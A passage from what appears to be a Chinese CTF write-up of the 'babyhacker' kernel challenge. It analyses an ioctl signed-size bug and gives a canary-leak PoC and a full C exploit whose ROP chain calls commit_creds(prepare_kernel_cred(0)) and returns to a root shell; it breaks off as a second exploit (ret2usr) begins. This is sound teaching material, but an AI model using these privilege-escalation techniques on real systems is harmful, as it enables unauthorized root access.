class="line">-s              shorthand for -gdb tcp::1234</span><br></pre></td></tr></table></figure><p>提取vmlinux，利用<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">extract-vmlinux</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinx babyhacker/bzImage &gt; babyhacker/vmlinux</span><br></pre></td></tr></table></figure><p>提取文件系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker mkdir core </span><br><span class="line">➜  babyhacker cd core</span><br><span class="line">➜  core mv ../initramfs.cpio ./</span><br><span class="line">➜  core cpio -idm &lt; initramfs.cpio</span><br></pre></td></tr></table></figure><p>查看init发现是空的，于是查看/etc/init.d/rcS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  core bat etc/init.d/rcS                             </span><br><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: etc/init.d/rcS</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │ </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ mkdir /dev/pts</span><br><span class="line">   6   │ mount /dev/pts</span><br><span class="line">   7   │ </span><br><span class="line">   8   │ insmod /home/pwn/babyhacker.ko</span><br><span class="line">   9   │ chmod 644 /dev/babyhacker</span><br><span class="line">  10   │ echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  11   │ echo 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ cd /home/pwn</span><br><span class="line">  14   │ chown -R root /flag</span><br><span class="line">  15   │ chmod 400 /flag</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ </span><br><span class="line">  18   │ chown -R 1000:1000 .</span><br><span class="line">  19   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  20   │ </span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ poweroff -f</span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到添加了内核模块<code>babyhacker.ko</code>，其中<code>dmesg_restrict = 0</code>表示可以直接查看<code>/proc/kallsyms</code>，<code>kptr_restrict=0</code>时，<code>lsmod</code>会直接打印内核地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~ $ lsmod</span><br><span class="line">babyhacker 2104 0 - Live 0xffffffffc0093000 (OE)</span><br><span class="line">~ $ cat /proc/kallsyms |grep commit_creds</span><br><span class="line">ffffffff8e2a1430 T commit_creds</span><br><span class="line">ffffffff8ef73ac0 R __ksymtab_commit_creds</span><br><span class="line">ffffffff8ef939e4 r __kstrtab_commit_creds</span><br><span class="line">~ $ cat /proc/kallsyms |grep prepare_kernel_cred</span><br><span class="line">ffffffff8e2a1820 T prepare_kernel_cred</span><br><span class="line">ffffffff8ef7c5b0 R __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff8ef939a8 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure><p>checksec vmlinux，<code>raw_vmlinux_base = 0xffffffff81000000</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker checksec vmlinux</span><br><span class="line">[*] &apos;/home/kangel/pwn/kernel/babyhacker/vmlinux&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>checksec babyhacker.ko，开启了canary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker checksec babyhacker.ko</span><br><span class="line">[*] &apos;/home/kangel/pwn/kernel/babyhacker/babyhacker.ko&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>ida查看babyhacker.ko</p><p>查看fop结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000000280 fops            file_operations &lt;offset __this_module, 0, 0, 0, 0, 0, 0, 0, \</span><br><span class="line">.data:0000000000000280                                         ; DATA XREF: .data:misc↑o</span><br><span class="line">.data:0000000000000280                                  offset babyhacker_ioctl, 0, 0, 0, 0, 0, 0, 0, 0, 0, \</span><br><span class="line">.data:0000000000000280                                  0, 0, 0, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data:0000000000000280 _data           ends</span><br></pre></td></tr></table></figure><p>发现只定义了babyhacker_ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">babyhacker_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  file *rdx1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> __int16 v5; <span class="comment">// di</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-150h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(file, cmd, arg);</span><br><span class="line">  v9 = v3;</span><br><span class="line">  v5 = (<span class="keyword">signed</span> __int16)rdx1;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30001</span>u:</span><br><span class="line">      babyhacker_ioctl_0(rdx1, <span class="number">0x30001</span>u, (<span class="keyword">unsigned</span> __int64)rdx1); <span class="comment">//写入栈</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30002</span>u:</span><br><span class="line">      copy_to_user(rdx1, v4, buffersize);  <span class="comment">//读出栈</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30000</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)rdx1 &gt;= <span class="number">11</span> )</span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">      buffersize = v5;  <span class="comment">//设置size</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>64位传参顺序：rdi、rsi、rdx、rcx、r8、r9，然后是栈。这里的rdx1即ioctl的第三个参数</p><p>可以看到，当rdx1为负数时，<code>buffersize = v5</code>为rdx1的低两字节可以达到<code>0xffff</code>，于是造成了对栈的越界读写，我们可以泄露canary然后rop</p><h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>首先把vmlinux的gadgets输出到文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker ROPgadget --binary ./vmlinux &gt; gadgets</span><br></pre></td></tr></table></figure><p>查找想要的gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker cat gadgets |grep &quot;: pop rdx ; ret$&quot;</span><br><span class="line">0xffffffff81083f22 : pop rdx ; ret</span><br></pre></td></tr></table></figure><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>poc.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line"><span class="string">"mov user_ss, ss;"</span></span><br><span class="line"><span class="string">"mov user_sp,rsp;"</span></span><br><span class="line"><span class="string">"pushf;"</span></span><br><span class="line"><span class="string">"pop user_rflags;"</span></span><br><span class="line">   );</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_buffersize</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]set buffersize to %d\n"</span>,idx);</span><br><span class="line">ioctl(fd, <span class="number">0x30000</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baby_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]read to buf."</span>);</span><br><span class="line">ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baby_write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]copy from user."</span>);</span><br><span class="line">ioctl(fd,<span class="number">0x30001</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">save_status();</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/babyhacker"</span>,O_RDONLY);  <span class="comment">//注意这里只能读</span></span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]open /dev/babyhacker error!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line">set_buffersize(fd, <span class="number">0x80000200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">baby_read(fd, buf);</span><br><span class="line"><span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">40</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker gcc poc.c -static -masm=intel -g -o poc    </span><br><span class="line">poc.c: In function ‘main’:</span><br><span class="line">poc.c:56:9: warning: format ‘%p’ expects argument of type ‘void *’]</span><br><span class="line">  printf(&quot;[+]canary: %p\n&quot;, canary);</span><br><span class="line">         ^</span><br><span class="line">➜  babyhacker mv poc core/home/pwn                                 </span><br><span class="line">➜  babyhacker cd core                             </span><br><span class="line">➜  core find . | cpio -o --format=newc &gt; ../initramfs.cpio</span><br><span class="line">15405 块</span><br></pre></td></tr></table></figure><p>进行调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker gdb ./vmlinux -q                       </span><br><span class="line">pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with prin)</span><br><span class="line">Reading symbols from ./vmlinux...(no debugging symbols found)...do.</span><br><span class="line">pwndbg&gt; add-symbol-file babyhacker.ko 0xffffffffc02ff000           </span><br><span class="line">add symbol table from file &quot;babyhacker.ko&quot; at</span><br><span class="line">        .text_addr = 0xffffffffc0093000</span><br><span class="line">Reading symbols from babyhacker.ko...done.</span><br><span class="line">pwndbg&gt; b *0xffffffffc02ff000+0x50                                 </span><br><span class="line">Breakpoint 1 at 0xffffffffc0093050: file /home/zoe/Desktop/kernel_.</span><br><span class="line">pwndbg&gt; target remote :1234                                        </span><br><span class="line">Remote debugging using :1234</span><br><span class="line">0xffffffff8e263656 in ?? ()</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img alt="" data-src="/2020/04/16/kernel-pwn-one/1.png" class="lazyload"></p><h4 id="exp1-ROP"><a href="#exp1-ROP" class="headerlink" title="exp1(ROP)"></a>exp1(ROP)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!getuid())</span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]spawn shell error!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810a1430</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1820</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line"><span class="string">"mov user_ss, ss;"</span></span><br><span class="line"><span class="string">"mov user_sp,rsp;"</span></span><br><span class="line"><span class="string">"pushf;"</span></span><br><span class="line"><span class="string">"pop user_rflags;"</span></span><br><span class="line">   );</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_buffersize</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]set buffersize to %d\n"</span>,idx);</span><br><span class="line">ioctl(fd, <span class="number">0x30000</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baby_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]read to buf.\n"</span>);</span><br><span class="line">ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]read to buf success!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baby_write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]copy from user.\n"</span>);</span><br><span class="line">ioctl(fd,<span class="number">0x30001</span>, buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]copy from user success!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">save_status();</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/babyhacker"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]open /dev/babyhacker error!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_buffersize(fd, <span class="number">0x80000200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">baby_read(fd, buf);</span><br><span class="line"><span class="keyword">size_t</span> offset = ((<span class="keyword">size_t</span> *)buf)[<span class="number">8</span>] - <span class="number">0xc2d84</span> - raw_vmlinux_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]offset: %p\n"</span>, offset);</span><br><span class="line"><span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">40</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line">commit_creds += offset;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]commit_creds: %p\n"</span>, commit_creds);</span><br><span class="line">prepare_kernel_cred += offset;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]prepare_kernel_cred: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff8109054d</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81083f22</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81006ffc</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810def79</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff810636b4</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81478294</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line">baby_write(fd, rop);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img alt="" data-src="/2020/04/16/kernel-pwn-one/2.png" class="lazyload"></p><h4 id="exp2-ret2usr"><a href="#exp2-ret2usr" class="headerlink" title="exp2(ret2usr)"></a>exp2(ret2usr)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 